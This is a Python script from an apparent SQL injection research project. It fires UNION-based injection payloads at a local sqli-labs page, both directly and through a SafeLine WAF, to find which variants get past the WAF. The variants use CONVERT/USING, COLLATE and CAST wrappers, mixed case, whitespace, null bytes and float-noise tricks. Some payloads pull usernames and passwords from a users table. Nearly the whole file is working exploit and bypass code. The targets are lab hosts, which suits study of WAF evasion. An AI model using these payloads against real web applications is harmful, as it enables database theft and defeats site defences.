"""
bypass_lab/test_using.py
=========================
Test USING utf8 / CONVERT / COLLATE variants.

Hipotesis user: 'database() USING utf8' pass Safeline tapi SQL error.
Fix: CONVERT(database() USING utf8) — valid MySQL, mungkin tetap pass WAF.

Run:
    python3 -m bypass_lab.test_using
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response, has_strict_markers
import requests

PLAIN = "http://localhost:8081/Less-1/"
WAF   = "http://localhost:8888/Less-1/"
M     = "'SEQSQLI_START','SEQSQLI_END'"
FOUND = []


def t(label, payload):
    rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
    rw = requests.get(WAF,   params={"id": payload}, timeout=8)

    plain_ok = classify_response(rp.text, rp.status_code, "union",
                                 strict_markers=True) == "SUCCESS"
    waf_ok   = classify_response(rw.text, rw.status_code, "union",
                                 strict_markers=True) == "SUCCESS"
    waf_pass = rw.status_code != 403

    plain_tag = "OK" if plain_ok else ("ERR" if "syntax" in rp.text.lower() else "NODATA")
    waf_tag   = "BYPASS!" if waf_ok else ("PASS(nodata)" if waf_pass else "BLOCK")

    print(f"  plain={plain_tag:<10} WAF={waf_tag:<15} | {label}")

    if waf_ok:
        FOUND.append((label, payload))
    elif waf_pass and plain_ok:
        # WAF lets it through, SQL valid on plain — near miss
        print(f"    *** NEAR MISS — WAF passed but data check failed ***")
        FOUND.append((f"[NEAR]{label}", payload))

    time.sleep(0.3)


print("=" * 65)
print(" USING / CONVERT / COLLATE bypass test")
print("=" * 65)

# ── 1. Payload user — invalid USING (baseline) ────────────────────────
print("\n[1] Original user payload (invalid syntax)")
t("database() USING utf8 (invalid)",
  f"-1' UNION SELECT database() USING utf8,{M}-- -")

# ── 2. CONVERT(x USING charset) — valid MySQL ─────────────────────────
print("\n[2] CONVERT(x USING charset) — valid MySQL")
for cs in ["utf8", "utf8mb4", "latin1", "binary", "ascii", "ucs2", "utf16"]:
    t(f"CONVERT USING {cs}",
      f"-1' UNION SELECT CONVERT(database() USING {cs}),{M}-- -")

# ── 3. CONVERT semua kolom ────────────────────────────────────────────
print("\n[3] CONVERT all columns")
t("CONVERT all cols utf8",
  f"-1' UNION SELECT CONVERT(database() USING utf8),"
  f"CONVERT('SEQSQLI_START' USING utf8),"
  f"CONVERT('SEQSQLI_END' USING utf8)-- -")

t("CONVERT+case",
  f"-1' uNiOn sElEcT CONVERT(database() USING utf8),{M}-- -")

# ── 4. COLLATE clause — valid MySQL ───────────────────────────────────
print("\n[4] COLLATE clause")
for col in ["utf8_bin", "utf8_general_ci", "latin1_swedish_ci",
            "utf8mb4_unicode_ci", "binary"]:
    t(f"COLLATE {col}",
      f"-1' UNION SELECT database() COLLATE {col},{M}-- -")

# ── 5. CAST ───────────────────────────────────────────────────────────
print("\n[5] CAST variants")
for typ in ["CHAR", "CHAR(64)", "BINARY", "BINARY(32)", "NCHAR"]:
    t(f"CAST AS {typ}",
      f"-1' UNION SELECT CAST(database() AS {typ}),{M}-- -")

# ── 6. Kombinasi CONVERT + teknik lain ───────────────────────────────
print("\n[6] CONVERT + whitespace/comment combos")
t("CONVERT+tab",
  f"-1'\tUNION\tSELECT\tCONVERT(database() USING utf8),{M}-- -")
t("CONVERT+newline",
  f"-1'\nUNION\nSELECT\nCONVERT(database() USING utf8),{M}-- -")
t("CONVERT+case+newline",
  f"-1'\nuNiOn\nsElEcT\nCONVERT(database() USING utf8),{M}-- -")
t("CONVERT+null_byte",
  f"-1' UNION SELECT CONVERT(database() USING utf8),{M};\x00")
t("CONVERT+float_noise",
  f"-1'.6e0 UNION SELECT CONVERT(database() USING utf8),{M}-- -")

# ── 7. USING dalam JOIN subquery ─────────────────────────────────────
print("\n[7] USING dalam JOIN context")
t("join USING",
  f"-1' UNION SELECT a.username,a.password,'end' "
  f"FROM users a JOIN users b USING(id)-- -")
t("natural join",
  f"-1' UNION SELECT username,password,'end' "
  f"FROM users NATURAL JOIN users u2-- -")

# ── Summary ───────────────────────────────────────────────────────────
print("\n" + "=" * 65)
print(f" FOUND / NEAR MISS: {len(FOUND)}")
for label, p in FOUND:
    print(f"  {label}")
    print(f"  {p[:100]}")
